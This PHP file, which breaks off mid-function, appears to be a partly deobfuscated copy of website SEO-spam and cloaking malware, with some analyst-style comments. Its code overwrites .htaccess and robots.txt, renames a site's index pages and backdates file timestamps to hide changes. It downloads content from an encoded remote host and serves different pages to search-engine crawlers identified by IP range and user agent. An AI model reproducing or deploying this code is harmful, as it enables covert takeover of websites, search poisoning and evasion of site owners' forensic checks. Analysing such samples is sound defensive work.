<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

/* Self source code */
$source = file_get_contents(__FILE__);

@set_time_limit(7200);
@ignore_user_abort(1);
@ob_start();

$param1  = "";
$param2  = 0;
$param3  = "";
$param4  = "";
$param5  = "";
$param6  = ".";
$param7  = "";
$param8  = 0;
$param9  = "";
$param10 = "";

$l1imRR  = 0;
$script_path = $script_name = $script_fullname =  $l1Z4k = $l1Ni6 =  "";
$l1T2 = $l1gfDiJL = $wordlist  = $l1GH0rfZ = array();
//$l1I = $_SERVER["DOCUMENT_ROOT"];


/* Write file */
function write_file($fname,$content='',$mode='w'){
    $file = @fopen($fname,$mode);
    if($file !== false){
        fwrite($file,$content);
        fclose($file);
    }
}

/* Download file using curl/fsockopen/pfsockopen */
function download($url){

    $l1Hi = 0;
    if(function_exists("curl_init") && function_exists("curl_exec")){
        $l15bc = curl_init();
        curl_setopt($l15bc,CURLOPT_URL,$url);
        curl_setopt($l15bc,CURLOPT_USERAGENT,"WHR");
        curl_setopt($l15bc,CURLOPT_CONNECTTIMEOUT,0);
        curl_setopt($l15bc,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($l15bc,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($l15bc,CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($l15bc,CURLOPT_FOLLOWLOCATION,true);
        curl_setopt($l15bc,CURLOPT_TIMEOUT,300);
        $l1er18S4 = curl_exec($l15bc);
        curl_close($l15bc);

        if($l1er18S4){
            $l1Hi=$l1er18S4;
        }
    }else{
        $func = '';
        if(function_exists("fsockopen")){
            $func = "fsockopen";
        }elseif(function_exists("pfsockopen")){
            $func = "pfsockopen";
        }

        if($func != ''){
            $l16LhCLJ = parse_url($url);
            $l1vY = $func($l16LhCLJ["host"],isset($l16LhCLJ["port"]) ? $l16LhCLJ["port"] : 80,$l19rmur2,$l1wLOnRg,30);
            if($l1vY){
                $l1Hi=isset($l16LhCLJ["path"])?$l16LhCLJ["path"]:'';
                $l1Hi.=isset($l16LhCLJ["query"])?'?'.$l16LhCLJ["query"]:'';
                $l1Hi=$l1Hi==''?'/':$l1Hi;
                fwrite($l1vY,"GET $l1Hi HTTP/1.0\r\nHost:".$l16LhCLJ["host"]."\r\nConnection:Close\r\n\r\n");
                $l1Hew='';
                while(!feof($l1vY)){
                    $l1Hew.=fgets($l1vY,4096);
                }
                fclose($l1vY);
                $l1Hi=preg_match("/^HTTP\/1/si",
                      $l1Hew)?preg_replace("/.*?\r\n\r\n(.*)/si","$1",$l1Hew):preg_replace("/^[^<]+?(<.*)/is","$1",$l1Hew);
            }
            else{
                $l1Hi=0;
            }
        }else{
            $l1Hi = file_get_contents($url);
        }
    }
    return trim(trim($l1Hi,"\xEF\xBB\xBF"));
}

/* Check if user agent matches */
function l1AZ($input='',$test_mode=false){
    $agents = "googlebot|baiduspider|bingbot|google|baidu|aol|bing|yahoo";
    if($test_mode) $agents .= "|Mozilla";
    return preg_match("/($agents)/si",$input);
}

function l1Qw8rL($l15sT8Q=''){
    $l18 = preg_match("/(google.co.jp|yahoo.co.jp|bing|baidu)/si",$l15sT8Q);
    if($l18){
        if(!isset($l1U["isytu"])){
            @setcookie("isytu",1,time()+3600*24*365);
        }
    }
    return $l18;
}

function l1J($l1A='',$l1Ckl=false,$l1dQ=1,$l1dah=''){
    if($l1Ckl){
        return $l1dQ;
    }else{
        if($l1A!=''){
            return $l1A;
        }else{
            $l1Qy7 = 0;
            $l1aFuQLm = $l1dah != '' ? preg_replace("/(\?|&)?(".$l1dah.").*/si",'',$_SERVER["REQUEST_URI"]) : $_SERVER["REQUEST_URI"];
            $l1Qy7 = md5($l1aFuQLm);
            $l1Qy7 = preg_replace("/[^\d]/si",'',$l1Qy7);
            if($l1Qy7 != 0){
                $l1v = strlen($l1Qy7);
                $l196Xh = strlen($l1dQ);

                if($l1v>$l196Xh){
                    $l1Qy7=(int)substr($l1Qy7,-($l196Xh));

                    if($l1Qy7>$l1dQ){
                        $l1Qy7=substr($l1Qy7,-($l196Xh-1));
                    }
                }else{
                    $l1Qy7=(int)$l1Qy7;
                    if($l1Qy7>$l1dQ){
                        $l1Qy7=substr($l1Qy7,-($l196Xh-1));
                    }
                }

                $l1Qy7=(int)$l1Qy7;
                if($l1Qy7!=0){
                    return(int)$l1Qy7;
                }
            }

            $l1a5km = "http://";

            if(isset($_SERVER["HTTP_HOST"]))   $l1a5km.=$_SERVER["HTTP_HOST"];
            if(isset($_SERVER["SERVER_NAME"])) $l1a5km.=$_SERVER["SERVER_NAME"];
            if(isset($_SERVER["REQUEST_URI"])) $l1a5km.=$_SERVER["REQUEST_URI"];
            if(isset($_SERVER["REMOTE_ADDR"])) $l1a5km.=$_SERVER["REMOTE_ADDR"];
            if(isset($_SERVER["SERVER_SOFTWARE"])) $l1a5km.=$_SERVER["SERVER_SOFTWARE"];
            
            if($l1dah!=''){
                $l1a5km=preg_replace("/(\?|&)?(".$l1dah.").*/si",'',$l1a5km);
            }

            return strlen($l1a5km);
        }
    }
}

/* Change file timestamp */
function change_timestamp($filename){
    if(file_exists($filename)) @touch($filename,strtotime("-777 days"));
}

/* Check if file is -777 old i.e. made by this script */
function is_old($filename){
    $flag = false;
    if(is_file($filename)){
        if(filemtime($filename) <= strtotime("-777 days")){
            $flag = true;
        }
    }

    return $flag;
}

function l1SU($l1jePKwT=''){
    $l1jePKwT=explode(',',$l1jePKwT);
    if(!empty($l1jePKwT)){
        foreach($l1jePKwT as $l1Z88VO){
            if(!is_old($l1Z88VO)){
                change_timestamp($l1Z88VO);
            }
        }
    }
}

/* Write htaccess */
function write_htaccess(){
    $l1XNaVU = ".htaccess";
    if(!is_old($l1XNaVU)){
        @chmod($l1XNaVU,0777);
        $l1eb = @file_get_contents($l1XNaVU);
        $l1k = array();
        if($l1eb!==false){
            preg_match_all("/<IfModule\s+mod_rewrite.c>[^<]+<\/IfModule>/si",$l1eb,$l1Ll);
            if(isset($l1Ll[0])&&!empty($l1Ll[0])){
                foreach($l1Ll[0] as $l1Hj2){
                    if(!preg_match("/(\{HTTP_USER_AGENT\}|webdirect.php|\/index.php|php\?hl=\\\$1|\^\(.\*\)\\\$|.\*-.\*|\?\\\$\d\d?\\\$1\d)/si",$l1Hj2)){
                        $l1k[]=$l1Hj2;
                    }
                }
            }
        }
        if(empty($l1k)){
            $l1k[] = sprintf("<IfModule%smod_rewrite.c>%sRewriteEngine%sOn%sRewriteCond%s%s{REQUEST_FILENAME}%s!-f%sRewriteCond%s%s{REQUEST_FILENAME}%s!-d%sRewriteRule%s.%sindex.php%s[L]%s</IfModule>",' ',"\n",' ',"\n",' ','%',' ',"\n",' ','%',' ',"\n",' ',' ',' ',"\n");
        }
        write_file($l1XNaVU,trim(implode("\n",$l1k)));
        $l1eb = $l1k = null;
        change_timestamp($l1XNaVU);
        @chmod($l1XNaVU,0444);
    }
}

/* ?? */
function l1Rc6HvA($l1ucnnn,$l13aW=1){
    $l1lEpe = '\\?/|&()[]{}+^$!:*';
    //$l1rPS2cy = l13C3($l1lEpe);
    $l1rPS2cy = preg_split("//u",$l1lEpe,-1,PREG_SPLIT_NO_EMPTY);

    $l17Ek = "%s%s";
    if($l13aW){
        $l1ucnnn = preg_replace("/(\?|#).*/si",'',$l1ucnnn);
    }
    foreach($l1rPS2cy as $l1k8){
        $l1ucnnn = str_replace($l1k8,sprintf($l17Ek,'\\',$l1k8),$l1ucnnn);
    }
    return $l1ucnnn;
}

function l1spc7n9($l1WD,$l1Vx,$l1iiC,$l1J){
    $l1Pt7l = array();
    if($l1Vx>0){
        if($l1WD<=$l1Vx){
            $l1Pt7l = range(0,$l1WD);
        }else{
            $l1lN5 = mt_rand(1,($l1WD-$l1Vx*2));
            $l1Pt7l = range($l1lN5,$l1lN5+$l1Vx-1);
        }
    }
    return $l1Pt7l;
}

/* Write robots.txt */
function write_robots_txt($doc_root=''){
    $robot_filename = "$doc_root/robots.txt";
    if(!is_old($robot_filename)){
        @chmod($robot_filename);
        write_file($robot_filename,sprintf("User-agent:%s*%sDisallow:",' ',"\n"));
        change_timestamp($robot_filename);
    }
}

function l1guW($l1GjNWID,$l1MC8=0){
    global$l1GH0rfZ,$l1Z4k,$param8,$wordlist;
    $l1GI03 = $l1GjNWID[0];
    $l129ZMS = $l1GjNWID[1];
    $l1m = $l1GjNWID[2];
    $l1r = '';
    $l16Bzq = $l1GI03+$l129ZMS;
    $l1uhLcQp = l1kohsP($l1GH0rfZ["url_rules"],$l16Bzq);

    if($l1uhLcQp!=''){
        $l1r=$l1GH0rfZ["url_prefix"].($l1GH0rfZ["url_prefix_qm"]?preg_replace("/\?/","QMQM",$l1uhLcQp):$l1uhLcQp);
        $l1eF1wx = $wordlist[array_rand($wordlist)];
        $l1RpDvj9=l1kohsP($l1GH0rfZ["extensions"],$l16Bzq);
        $l1r=str_replace(array('#','^','$','!','*'),array($l1eF1wx,$l1GI03,$l129ZMS,$l129ZMS,$l1RpDvj9),$l1r);
        preg_match_all("/\[(\d)\:(.*?)\]/",$l1r,$l1XukJCN);

        if(isset($l1XukJCN[0])){
            foreach($l1XukJCN[0]as$l1VxUy=>$l1s9Q5C){
                $l1pa = $l1XukJCN[1][$l1VxUy]==''?0:$l1XukJCN[1][$l1VxUy];
                $l1g = $l1XukJCN[2][$l1VxUy]==''?"3~5":$l1XukJCN[2][$l1VxUy];
                $l1r = preg_replace('/'.addcslashes($l1s9Q5C,"[]:~")."/si",l1RnVra($l1pa,$l1g,-1),$l1r,1);
            }
        }
        $l1r = $l1GH0rfZ["url_prefix_qm"]?preg_replace("/QMQM/","%3F",$l1r):$l1r;
    }
    return $l1Z4k.($l1MC8?$l1r:"$l1r$l1m{$l1GjNWID[3]}<");
}

function l1kohsP($l1C=array(),$l1zoXNve=0){
    $l1WRE66m='';
    $l1zoXNve=(int)$l1zoXNve;
    if(!empty($l1C)){
        if(isset($l1C[$l1zoXNve])){
            $l1WRE66m=$l1C[$l1zoXNve];
        }else{
            $l1WRE66m=$l1C[$l1zoXNve%count($l1C)];
        }
    }
    return $l1WRE66m;
}

function l1g1oAl2($url,$l1qu2H,$l113,$l1V=0){
    //echo "CALL ME" . "\n";

    $l1yc8E=array(0,array());
    if(!empty($l1qu2H)){
        $l1vS3H = !empty($l113)?implode('|',$l113):'';
        foreach($l1qu2H as $l1O){
            $l1O=preg_replace("/\[0\:.*?\]/si","[a-z]+",$l1O);
            $l1O=preg_replace("/\[1\:.*?\]/si","[0-9]+",$l1O);
            $l1O=preg_replace("/\[2\:.*?\]/si","[a-z0-9]+",$l1O);
            $l1O=preg_replace("/\[3\:.*?\]/si","[a-zA-Z]+",$l1O);
            $l1O=preg_replace("/\[4\:.*?\]/si","[A-Z]+",$l1O);
            $l1O=preg_replace("/\[5\:.*?\]/si","[a-zA-Z0-9]+",$l1O);
            $l1O=strtr($l1O,array('@'=>")|(",'{'=>'((','}'=>'))','?'=>$l1V?"%3F":'\?','#'=>"[a-zA-Z]+",'^'=>"(\d+)",'!'=>"(\d+)",'/'=>'\/','+'=>'\+','*'=>($l1vS3H!=''?"($l1vS3H)":'')));
            $l1O = str_replace("]\+",']+',$l1O);
            $l12Dw = array();
            if(preg_match("/^$l1O$/",urldecode($url),$l12Dw)){
                $l1yc8E=array(1,$l12Dw);
                break;
            }
        }
    }

    //print_r($l1yc8E);

    return $l1yc8E;
}

/* Get user IP from header */
function get_user_IP(){
    $keys = array("HTTP_CDN_SRC_IP","HTTP_PROXY_CLIENT_IP","HTTP_WL_PROXY_CLIENT_IP","HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","REMOTE_ADDR",);
    $IP = "unknown";

    foreach($keys as $key){
        if(!empty($_SERVER[$key]) && strtolower($_SERVER[$key])!="unknown"){
            $IP = $_SERVER[$key];
            break;
        }
    }
    return $IP;
}

/* Check IP */
function l1gVD2yX(){

    // For debugging
    //return true;

    $user_agent = @strtolower($_SERVER["HTTP_USER_AGENT"]);

    if($user_agent == "yuantuobot") return true;

    if(strpos(@strtolower($_SERVER["HTTP_REFERER"]),"translate") != false){
        return false;
    }

    $user_IP = get_user_IP();

    /* Convert IPv4 to long integer */
    if(($IP_long = ip2long($user_IP))<0){
        $IP_long += 4294967296;
    }

    /* IP ranges */
    $IP_range = array(array(3639549953,3639558142),
                array(1089052673,1089060862),
                array(1123635201,1123639294),
                array(1208926209,1208942590),
                array(3512041473,3512074238),
                array(1113980929,1113985022),
                array(1249705985,1249771518),
                array(1074921473,1074925566),
                array(3481178113,3481182206),
                array(2915172353,2915237886),
                array(2850291712,2850357247),
                array(1823129600,1823145983),
                array(1823539200,1823571967),array(2398748672,2398879743),array(2899902464,2899967999),array(2902261760,2902327295),
                array(2915172352,2915237887),array(3232890880,3233021951),array(3344429056,3344430079),array(3481178112,3481182207),
                array(3487539200,3487543295),array(3518562304,3518627839),array(3512041472,3512074239),array(3639549952,3639558143),
                array(3625975808,3626237951),array(3627728896,3627737087),array(1074921472,1074925567),array(1089052672,1089060863),
                array(1078214656,1078222847),array(1113980928,1113985023),array(1123631104,1123639295),array(1176535040,1176543231),
                array(1180172288,1180434431),array(1208926208,1208942591),array(1249705984,1249771519),array(134217728,150994943),
                array(1081896984,1081896991),array(2159111488,2159111679),array(2159128096,2159128111),array(3468331392,3468331283),array(3459234728,3459234735),array(3475195328,3475195391),array(3494556048,3494556063),array(3522775360,3522775367),array(1062518496,1062518527),array(1081575648,1081575655),array(1081927080,1081927087),array(1082183584,1082183599),array(1074918400,1074918431),array(1103424288,1103424303),array(1104396896,1104396911),array(1104572512,1104572543),array(1104609120,1104609135),array(1105036720,1105036735),array(1105135664,1105135679),array(1119913504,1119913519),array(1132356616,1132356623),array(1180359472,1180359479),array(1180359496,1180359503),array(3518589952,3518590207),
                array(3518627072,3518627327),array(3512069632,3512069887),array(3639550208,3639550463),array(3639551232,3639551487),array(3639551842,3639551843),array(3639552352,3639552355),array(3639553280,3639553535),array(3639553536,3639553791),array(3639554912,3639556963),array(3626100131,3626100131),array(1089056193,1089056255),array(1078218752,1078219007),array(1078219008,1078219263),array(1078219264,1078219519),array(1078219520,1078219775),array(1078219776,1078220031),array(1078220032,1078220287),array(1078220288,1078220543),array(1078220544,1078220799),array(1078220800,1078221055),array(1078221056,1078221311),array(1078221313,1078221567),array(1078221568,1078221823),array(1078221824,1078222079),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123631872,1123632127),array(1123632128,1123632383),array(1123632384,1123632639),array(1123632640,1123632895),array(1123632896,1123633151),array(1123633152,1123633407),array(1123633408,1123633663),array(1123634688,1123634943),array(1123634944,1123635199),array(1208928000,1208928000),array(134623232,134623487),array(1123634176,1123634431),array(1089052672,1089060863),array(1113980928,1113985023),array(1123631104,1123639295),array(1208926208,1208942591),array(1249705984,1249771519),array(3512041472,3512074239),array(3639549952,3639558143),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),
                array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1089052928,1089053183),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(1089060096,1089060351),array(1113983744,1113983999),array(1113982720,1113982975),array(1113983232,1113983487),array(1123631104,1123631359),array(1123631360,1123631615),array(1123631616,1123631871),array(1123632896,1123633151),array(1123633152,1123633407),array(1208930048,1208930303),array(3639550208,3639550463),array(3639550720,3639550975),array(3639551232,3639551487),array(3639551744,3639551999),array(3639554816,3639555071),array(3639555328,3639555583),array(3639555840,3639556095),array(3639556352,3639556607),array(3639556864,3639557119),array(1123631360,1123631615),array(1123632128,1123632383),array(1123632896,1123633151),array(3419421696,3419421951),array(3729389312,3729389567),array(1090060288,1090125823),array(1078394880,1078460415));

    foreach($IP_range as $range){
        if($IP_long>=$range[0] && $IP_long<=$range[1]){
            return true;
        }
    }

    /* IP whitelist */
    $IP_whitelist = array(134217728,150994943,1062518496,1062518527,1074918400,1074918431,1074921472,1074925567,1078214656,1078222847,
                          1081575648,1081575655,1081896984,1081896991,1081927080,1081927087,1082183584,1082183599,1089052672,1089060863,
                          1103424288,1103424303,1104396896,1104396911,1104572512,1104572543,1104609120,1104609135,1105036720,1105036735,
                          1105135664,1105135679,1113980928,1113985023,1119913504,1119913519,1123631104,1123639295,1132356616,1132356623,
                          1176535040,1176543231,1180172288,1180359472,1180359479,1180359496,1180359503,1180434431,1208926208,1208942591,
                          1249705984,1249771519,1823129600,1823145983,1823539200,1823571967,2159111488,2159111679,2159128096,2159128111,
                          2398748672,2398879743,2899902464,2899967999,2902261760,2902327295,2915172352,2915237887,3232890880,3233021951,
                          3344429056,3344430079,3459234728,3459234735,3468331392,3468331455,3475195328,3475195391,3481178112,3481182207,
                          3487539200,3487543295,3494556048,3494556063,3512041472,3512074239,3518562304,3518627839,3522775360,3522775367,
                          3625975808,3626237951,3627728896,3627737087,3639549952,3639558143);

    foreach($IP_whitelist as $IP){
        if($IP_long == $IP) return true;
    }

    $bots = array("googlebot","bingbot","slurp","msnbot","jeeves","teoma","crawler","spider");

    foreach($bots as $bot){
        if(strpos($user_agent,$bot)!==false){
            return l1n($user_IP,$user_agent);
        }
    }
    return false;
}

/* Check crawler host address  */
function l1n($l12,$l1uiO){
    $l1U5o = array("google"=>array("Googlebot","googlebot.com",),
                   "yahoo"=>array("Yahoo!","inktomisearch.com",),
                   "msn"=>array("MSNBot","live.com",),
                   "bing"=>array("bingbot","msn.com",),
                  );

    if(!preg_match('/^(\d{1,3}\.){3}\d{1,3}$/',$l12)){
        return false;
    }

    if(empty($l1uiO)) return false;

    foreach($l1U5o as$l1xw=>$l1NuWnWf){
        if(stripos($l1uiO,$l1NuWnWf[0])!==false){
            $l16Xp = gethostbyaddr($l12);
            if($l16Xp && stripos($l16Xp,$l1NuWnWf[1])!==false){
                return$l1xw;
            }
        }
    }

    return false;
}

function l15w($l1WoAo5U,$l1OZb,$l1S=array()){
    $l1Lp=array('a'=>-1,'b'=>-1);
    if(is_array($l1S)){
        foreach($l1S as$l12b){
            if(is_numeric($l12b)){
                if($l1Lp["a"]==-1){
                    $l1Lp["a"]=$l12b;
                }else{
                    $l1Lp["b"]=$l12b;
                }
            }
        }
    }
    return $l1Lp;
}

/* Convert html entities and vice-versa */
function l1kw6($string='',$mode=0){
    if($mode){
        $string = preg_replace("/&amp;/s",'&',$string);
        $string = preg_replace("/&apos;/s","'",$string);
        $string = preg_replace("/&quot;/s",'"',$string);
        $string = preg_replace("/&gt;/s",'>',$string);
        $string = preg_replace("/&lt;/s",'<',$string);
    }else{
        $string = preg_replace("/&/s","&amp;",$string);
        $string = preg_replace("/'/s","&apos;",$string);
        $string = preg_replace('/"/s',"&quot;",$string);
        $string = preg_replace("/>/s","&gt;",$string);
        $string = preg_replace("/</s","&lt;",$string);
    }
    return  $string;
}

function l1RnVra($l1P=0,$l1X='3~5',$l108=-1){
    $l16 = range('a','z');
    $l1xi = range('A','Z');
    $l1l = range(0,9);

    switch($l1P){
        case 0:$l1i052=$l16;
            break;
        case 1:$l1i052=$l1l;
            break;
        case 2:$l1i052=array_merge($l16,$l1l);
            break;
        case 3:$l1i052=array_merge($l16,$l1xi);
            break;
        case 4:$l1i052=$l1xi;
            break;
        case 5:$l1i052=array_merge($l16,$l1xi,$l1l);
            break;
    }

    $l1Si=explode('~',$l1X);

    if(count($l1Si)==1){
        $l1X=(int)$l1X;
    }else{
        $l1X=mt_rand((int)$l1Si[0],(int)$l1Si[1]);
    }

    $l1K9o0F1 = '';
    shuffle($l1i052);
    $l1K9o0F1 = substr(implode('',$l1i052),0,$l1X);
    return $l1K9o0F1;
}

function l19($l1SDKs){
    global $l1Ni6,$param2;
    $l1Nt = str_replace("$l1SDKs/",'',$l1Ni6);
    $l1BRS = array();
    $l1O = l1BSTEtn(download($l1SDKs));
    $l1BRS[] = $param2;

    foreach($l1O as $l184039L){
        $_SERVER["REQUEST_URI"]="/$l184039L";
        $l1BRS[]=l1J('',0,$param2);
    }

    array_unshift($l1O,'');
    return array('a'=>$l1BRS,'b'=>$l1O);
}

//decrypt domain.txt?
//l1gu is int
function l1HsDyi2($filename,$url,$l1gu){
    $l1IOCJO = array();
    $l1wI17dN = @file_get_contents($filename);
    if($l1wI17dN === false){
        $l1wI17dN = download($url);
        @write_file($filename,$l1wI17dN);
    }
    $l1wI17dN = explode('|',$l1wI17dN);
    $l1sei6v = PHP_INT_MAX;
    foreach($l1wI17dN as $l1y){
        $l14Sn29 = explode('-',$l1y);
        if($l1sei6v>$l14Sn29[2]){
            $l1sei6v = $l14Sn29[2];
        }
        $l1IOCJO[$l14Sn29[0]] = array();
    }
    $l1jQISa = array();
    for($l1tz9b=0;$l1tz9b<$l1gu;$l1tz9b++){
        $l1jQISa[]=mt_rand(0,$l1sei6v-1);
    }
    foreach($l1IOCJO as $l1u8lF=>$l1qpXI){
        $l1IOCJO[$l1u8lF]=$l1jQISa;
    }
    return $l1IOCJO;
}

// Decode URL
// inp: http://zenjp65.tppuwjrtyj563nskt/weilai0.php
// out: http://zenjp65.okkpremote01.info/weilai0.php

function decode_URL($l1qMwO){
    $l1dgT = '';
    preg_match("/([^\.]+\.)(.*)(\/.*)/",$l1qMwO,$l147sy);
    if(is_array($l147sy) && count($l147sy)==4){
        if($l147sy[2] != ''){
            $l1TKft0 = preg_split("//",$l147sy[2],-1,PREG_SPLIT_NO_EMPTY);
            foreach($l1TKft0 as $l1Z=>$l1lemlY6){
                $l1TKft0[$l1Z] = chr(ord($l1lemlY6)-5);
            }
            $l1dgT = implode('',$l1TKft0);
        }
        $l1dgT = $l147sy[1].$l1dgT.$l147sy[3];
    }
    return $l1dgT;
}

function l1BSTEtn($l1bC){

    global $l1Ni6;
    $l16Hy2G = array();
    preg_match_all("/<a.*?href=['\"]?(.*?)['\"\s>]/si",$l1bC,$l1TJWV);

    if(isset($l1TJWV[1])&&!empty($l1TJWV[1])){
        foreach($l1TJWV[1]as$l1je2vbZ){
            $l1je2vbZ=trim($l1je2vbZ);
            if($l1je2vbZ!=''){
                $l1je2vbZ=preg_replace("/^(https?\:)?\/\/[^\/]+\/?/si",'',trim($l1je2vbZ));
                $l1je2vbZ=preg_replace("/^[\/#]/si",'',$l1je2vbZ);
                $l1je2vbZ=str_replace('\\','',$l1je2vbZ);
                if($l1je2vbZ!=''&&!preg_match('/\.(jpg|jpeg|gif|png|bmp|svg)$/si',$l1je2vbZ)){
                    if(!in_array($l1je2vbZ,$l16Hy2G)){
                        $l16Hy2G[]=l1kw6($l1je2vbZ,1);
                    }
                }
            }
        }
    }
    return $l16Hy2G;
}

// Check whether HTTP protocal has SSL support or not
// Return s if true
function ssl($q=0){
    //$l1ppW = '';
    if($q==0){
        if( ((isset($_SERVER["HTTPS"]))&&(strtolower($_SERVER["HTTPS"])=='on')) || 
            ((isset($_SERVER["HTTP_X_FORWARDED_PROTO"]))&&(strtolower($_SERVER["HTTP_X_FORWARDED_PROTO"])=="https")) ){
                return 's';
        }
    }else{
        if($q==2) return 's';
    }
    return '';
}

// Main function . No other function after this
// 500 lines
function main(){

    $l1xj0grt = $l1YlvID = "jpwanda|jpyahoo";
    $content_header = "Content-type:text/%sml;charset=utf-8";
    $l1YlvID = explode('|',$l1YlvID);
    $hostname = '';

    if(isset($_SERVER["HTTP_HOST"])){
        $hostname = $_SERVER["HTTP_HOST"];
    }elseif(isset($_SERVER["SERVER_NAME"])){
        $hostname = $_SERVER["SERVER_NAME"];
    }

    // Uncomment just to be safe
    //write_htaccess();

    // Config variables
    global $param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$param9,$param10;
    global $wordlist,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$script_path,$script_fullname,$script_name,$l1I,$l1Ni6,$l1Z4k;
    

    write_robots_txt($_SERVER["DOCUMENT_ROOT"]);

    /* Parse config */
    /*
    if(isset($_SESSION["config"])){
        $configs = $_SESSION["config"];
    }else{
        preg_match("/@'\\\$(.*?)';/s",file_get_contents(__FILE__),$configs);
    }

    $configs = (is_array($configs) && isset($configs[1])) ? trim($configs[1]) : '';
    //$config_params = array();

    if($configs != ''){
        $configs = explode("\n",$configs);
        foreach($configs as $row){
            $row = trim($row);
            if($row=='') continue;
            preg_match("/^\w+=(.*)/si",$row,$pairs);
            if(isset($pairs[1])) $config_params[] = $pairs[1];
            
        }
        if(count($config_params)!=10) exit("cfg_params_error");
        list($l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $config_params;
    }
    */


    /*
    foreach($config_params as $c){
        echo $c . "\n";
    }
    */

    /* Define config parameters */
    $config_params = array(
                      "69",
                      "7630",
                      "",
                      "pxTyIoPYDA",
                      "rebel,specialty,LastYear,Shell,external,formal,gherkin,photography,otherthings,guide,easily,agricultural,receiver,become,bedroom,Pupil,rented,tofu,DragonBoat,behavior,council,orangejuice,removal,jeans,eggplant,middletoe,emptythe,SunnySideUp,FoldingChair,coconut",
                      "",
                      "http://zenjp65.tppuwjrtyj563nskt/weilai0.php",
                      "0000",
                      "111111010",
                      "[0:6~10]/^[0:6~10]-[1:4~6][0:2]-!/|[0:6~12]/^[0:6~12]-![0:1]-[0:8~10]/|[0:8~12]/^[0:6~12]-[2:10~12]-[1:3~5]-!/|^/[0:12~15][1:3][0:6~10]!/|^_[0:12~15]-[0:12~15]-!/|[0:8~12]/^[0:15~18]!/|^-[0:15][2:6][0:8]!/|^/![0:12~15]/[0:6]/|^[0:1]!-[0:15~18]/|^-[0:5~10]![0:15~18]/|^-[2:8]-[2:8~10]-[1:8~10]-!|^[0:3][2:15~18][0:3]!|[0:12]/^[0:5][1:10~12]/!|^-[2:15~18][0:5]!|[0:3]^[0:6][2:10][0:2]!|[0:8~12]^/[1:6][0:8]!|[0:6]-[0:10]/^[0:10]!-[0:2]|[0:1]-^-[1:5]-[0:5]-[1:5]-[0:5]!|^/[0:10~12]/!_[0:10~12].cgi|[0:10~15]/^[0:1]!-[0:12].jp|[0:10~12]/[0:10~12]/^[0:1]!.review|^_[0:10~12]!_[0:10~12].default|[0:10~15]/[0:10~15]/^_!.html|[0:6]/^/!/[0:15~18].html"
                    );


    list($param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$param9,$param10) = $config_params;

    //print_r($config_params);

    $param1 = trim($param1);
    $param2 = trim($param2);
    $l1imRR = preg_match("/\?/",$param3);
    $wordlist = explode(',',$param5);
    $l1cdE = $param10;
    $param10 = explode('||',$param10);

    if(empty($param10)) exit("urlgz=?");

    $l1gfDiJL = explode('|',$param10[0]);
    $l1T2 = isset($param10[1]) ? explode(',',$param10[1]) : array();
    $l13dbLD = $param1;
    $l19 = $param2;
    $l1c = $param9;
    $param8 = preg_split('//',$param8,-1,PREG_SPLIT_NO_EMPTY);
    $param9 = preg_split('//',$param9,-1,PREG_SPLIT_NO_EMPTY);
    $param8 = count($param8) !=4 ? array(1,1,1,0) : $param8;
    $param9 = count($param9) !=9 ? array(1,0,1,1,0,1,0,0,0) : $param9;
    $l1f1oojq = sprintf("http%s://$hostname",ssl($param9[8]));
    $l1qv = str_replace("www.",'',$hostname); // Domain or IP

    // Note on param 9 (boolean array)
    // p9[8]: indicates HTTP 0 or HTTPS 1

    $l1ekHESi = $l1c9 = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : (isset($_SERVER["QUERY_STRING"]) ? $_SERVER["QUERY_STRING"] : '');
    // e.g. /backdoor/obs.php?foo=bar
    $l1ekHESi = $l1c9 = ($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);

    $l1i = $l1f1oojq.$l1ekHESi; // full url with get params
    $script_path = '';

    //echo $l1i . "<br>";

    //print_r($param9);

    /* Rename original index file */
    if(file_exists("index.htm")) @rename("index.htm","index.htm000");;
    if(file_exists("index.html")) @rename("index.html","index.html000");

    $index_file = '';
    if(file_exists("index.htm000"))  $index_file = "index.htm000";
    if(file_exists("index.html000")) $index_file = "index.html000";

    //echo $index_file;

    $script_fullname = isset($_SERVER["SCRIPT_NAME"]) ? $_SERVER["SCRIPT_NAME"] : '';
    if($script_fullname == ''){
        $script_fullname = isset($_SERVER["SCRIPT_FILENAME"]) ? $_SERVER["SCRIPT_FILENAME"] : '';
        if($script_fullname != ''){
            $script_fullname = str_replace($_SERVER["DOCUMENT_ROOT"],'',$script_fullname);
        }
    }


    l1SU($_SERVER["DOCUMENT_ROOT"] . "$script_fullname," . __FILE__);

    //$script_fullname = "/a/b/c/d/x.php";

    if($script_fullname != ''){
        $script_fullname = substr($script_fullname,1);
        $slash = strrpos($script_fullname,'/');
        $script_path = $slash !== false ? substr($script_fullname,0,$slash):'';
        $script_name = $slash !== false ? substr($script_fullname,$slash+1):$script_fullname;
    }

    //echo $script_path . " ";
    //echo $script_name . " ";
    //exit();

    //echo $script_fullname;

    //$l1GpDpli = !is_old(__FILE__); // Not used?
    $l1Z4k = preg_match('/!$/',$param3) ? 1 : 0;
    $param3 = preg_replace('/!/','',$param3);
    $param3 = $param3 == '?' ? "$script_name?": ($param3=='/'?"$script_name/" : $param3);
    $l1jBj79X = explode('|',"index.php|default.php|index.html|index.htm");
    $l1jBj79X[] = $script_name;
    $l1uH = false;
    $l1RB6TU = $l1xj0grt."|ls1|ls2";
    $l1RB6TU = explode('|',$l1RB6TU);

